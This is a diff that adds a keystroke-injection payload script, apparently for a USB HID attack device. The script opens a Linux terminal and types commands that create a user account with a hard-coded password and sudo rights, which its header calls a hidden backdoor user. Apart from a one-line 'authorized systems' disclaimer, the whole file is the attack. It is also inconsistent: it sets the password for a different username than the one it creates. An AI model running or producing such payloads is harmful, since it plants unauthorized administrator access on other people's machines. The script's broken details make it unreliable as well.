@@ -1,0 +1,14 @@
+META linux acceso
+REM Title: Backdoor User
+REM Description: Creates a hidden sudo user
+REM Change USERNAME and PASSWORD before using
+REM Use only on authorized systems
+
+DEFAULTDELAY 500
+CTRL ALT t
+DELAY 800
+STRING sudo useradd -m -s /bin/bash soporte && echo "helpdesk:e9!4!u%%a%H46%" | sudo chpasswd && sudo usermod -aG sudo soporte
+ENTER
+DELAY 2000
+STRING exit
+ENTER
